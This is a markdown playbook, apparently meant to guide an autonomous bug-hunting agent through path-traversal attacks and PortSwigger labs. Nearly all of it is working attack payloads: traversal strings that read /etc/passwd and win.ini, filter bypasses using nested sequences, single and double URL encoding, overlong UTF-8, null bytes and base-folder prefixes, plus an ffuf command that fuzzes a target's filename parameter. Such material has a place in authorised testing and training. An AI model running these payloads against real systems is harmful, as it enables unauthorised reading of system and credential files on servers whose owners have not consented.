# Path Traversal / Directory Traversal Methodology
## Expert-Level Playbook for Autonomous Bug Hunting

> Read (or write) files outside the intended directory by injecting `../`
> sequences into a filename/path parameter.

---

## Phase 1: Detection & Fingerprinting

### 1.1 Locate File-Referencing Parameters
- Image loaders (`?filename=`, `?file=`, `?path=`, `?doc=`, `?page=`)
- Download endpoints, template/include params, avatar/upload retrieval
- Any value that ends up on the filesystem

### 1.2 Baseline & Probe
```
GET /image?filename=cat.jpg           (baseline)
GET /image?filename=../../../etc/passwd
```
- Success signal: `root:x:0:0:` (Linux) or `[fonts]`/`[extensions]` (win.ini)

---

## Phase 2: Exploitation Techniques

### 2.1 Absolute Path
```
filename=/etc/passwd
```

### 2.2 Standard Traversal
```
filename=../../../../etc/passwd
```

### 2.3 Bypassing Filters
```
# Nested sequences (strip-once filters)
filename=....//....//....//etc/passwd
filename=..././..././..././etc/passwd

# URL encoding
filename=..%2f..%2f..%2fetc%2fpasswd
# Double URL encoding
filename=..%252f..%252f..%252fetc%252fpasswd
# Non-standard / overlong UTF-8
filename=..%c0%af..%c0%afetc/passwd
```

### 2.4 Required Base Folder
```
# App validates the path starts with an expected folder
filename=/var/www/images/../../../etc/passwd
```

### 2.5 Required File Extension (Null Byte)
```
# Legacy platforms — validate ".png" suffix
filename=../../../etc/passwd%00.png
```

### 2.6 Windows Targets
```
filename=..\..\..\windows\win.ini
filename=..%5c..%5c..%5cwindows%5cwin.ini
```

---

## Phase 3: PortSwigger Lab-Specific Techniques
- **Simple case**: `../../../etc/passwd`.
- **Absolute path bypass**: `/etc/passwd`.
- **Nested traversal (non-recursive strip)**: `....//`.
- **Superfluous URL-decode**: `..%252f`.
- **Validation of start of path**: prepend the expected base dir then traverse.
- **Validation of file extension with null byte**: `...%00.png`.

---

## Phase 4: Tools & Automation
```bash
# Burp Intruder / ffuf a traversal wordlist against the filename param
ffuf -w traversals.txt -u "http://target/image?filename=FUZZ" -mr "root:x:0:0"
```
- Wordlists: `seclists/Fuzzing/LFI/*` (encodings + depth variants)

---

## Common Failure Modes & Solutions
| Problem | Solution |
|---------|----------|
| `../` stripped | Use `....//` or encodings |
| Filter decodes once | Double-encode `%252f` |
| Base dir enforced | Prefix expected dir, then traverse |
| Extension enforced | Null byte `%00.png` (legacy only) |

## Success Criteria
- [ ] Retrieved `/etc/passwd` (or `win.ini`) content
- [ ] Lab shows "solved"
